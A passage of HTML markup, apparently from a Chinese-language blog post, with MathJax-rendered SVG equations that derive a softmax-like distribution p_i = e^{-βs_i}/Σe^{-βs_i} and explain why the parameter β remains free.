59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g><g data-mml-node=\"mi\" transform=\"translate(889.6,-686)\"><path data-c=\"1D44D\" d=\"M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z\"/></g><rect width=\"2262.2\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(10220.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(11276.1,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mspace\" transform=\"translate(11776.1,0)\"/><g data-mml-node=\"mo\" transform=\"translate(12053.9,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(13331.7,0)\"><path data-c=\"1D44D\" d=\"M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(14332.5,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(15388.2,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(600,-1084.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msup\" transform=\"translate(16998.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,413) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(778,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1344,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></g></g></svg></mjx-container></span> 化简得到： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.354ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"14.062ex\" height=\"5.833ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1537.5 6215.3 2578.2\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1107.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(2163.5,0)\"><g data-mml-node=\"msup\" transform=\"translate(994.8,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(778,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1344,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-747.5)\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msup\" transform=\"translate(1549.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,289) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(778,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1344,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></g><rect width=\"3811.8\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span></p>\n<blockquote>\n<p>得到的结果还有一个参数 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.281ex\" height=\"2.034ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 566 899\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g></g></g></svg></mjx-container></span>\n没消掉，是因为一开始有 n+2 个变量（n 个 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.878ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 830 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span> 和 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.027ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.319ex\" height=\"1.597ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 583 706\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g></g></g></svg></mjx-container></span> 和 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.281ex\" height=\"2.034ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 566 899\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g></g></g></svg></mjx-container></span> ）但是只用到了 n+1\n个约束，所以是一个不定方程。</p>\n<p>第二个约束是用来限制期望的，而期望是什么我们都可以接受，（<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.489ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.364ex\" height=\"1.489ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 603 658\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D707\" d=\"M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z\"/></g></g></g></svg></mjx-container></span> 本身就没确定），所以我们可以通过确定\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.281ex\" height=\"2.034ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 566 899\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g></g></g></svg></mjx-container></span> 间接确定 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.489ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.364ex\" height=\"1.489ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 603 658\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D707\" d=\"M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z\"/></g></g></g></svg></mjx-container></span> 。也就是说 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.281ex\" height=\"2.034ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 566 899\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g></g></g></svg></mjx-container></span> 可以任意取值。</p>\n</blockquote>\n<p>取 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"7.189ex\" height=\"2.034ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 3177.6 899\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 